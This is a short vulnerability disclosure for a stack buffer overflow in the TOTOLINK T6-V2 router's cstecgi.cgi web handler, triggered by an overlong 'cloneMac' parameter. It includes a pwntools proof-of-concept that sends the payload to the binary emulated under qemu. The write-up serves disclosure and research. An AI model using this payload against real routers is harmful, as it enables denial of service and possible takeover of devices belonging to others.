## Overview

- The device's official website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=products&id=16&ids=33
- Firmware download website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=16&ids=36

## Affected version

T6-V2 V4.1.9cu.5179_B20201015

## Vulnerability details

The vulnerability exists in the router's WEB component. `/web_cste/cgi-bin/cstecgi.cgi` `FUN_0041621c` (at address 0x41621c) gets the JSON parameter `cloneMac`, but without checking its length, copies it directly to local variables in the stack, causing stack overflow: 

<img src="img/image-20220529110324018.png" alt="image-20220529110324018" style="zoom:67%;" />

When parameter `proto` is equal to `1`, program will enter the danger if branch at line 125. Then the program gets the parameter `cloneMac`, splits it, and connects the segmented string to local variables in the stack without checking its length.

<img src="img/image-20220529110510252.png" alt="image-20220529110510252" style="zoom:67%;" />

## PoC

```python
from pwn import *
import json

data = {
    "topicurl": "setting/setWizardCfg",
    "proto": "1",
    "cloneMac": "A"*0x400 + ":" + "A"
}

data = json.dumps(data)
print(data)

argv = [
    "qemu-mipsel-static",
    "-g", "1234",
    "-L", "./root/",
    "-E", "CONTENT_LENGTH={}".format(len(data)),
    "-E", "REMOTE_ADDR=192.168.2.1",
    "./cstecgi.cgi"
]

a = process(argv=argv)
a.sendline(data.encode())

a.interactive()
```

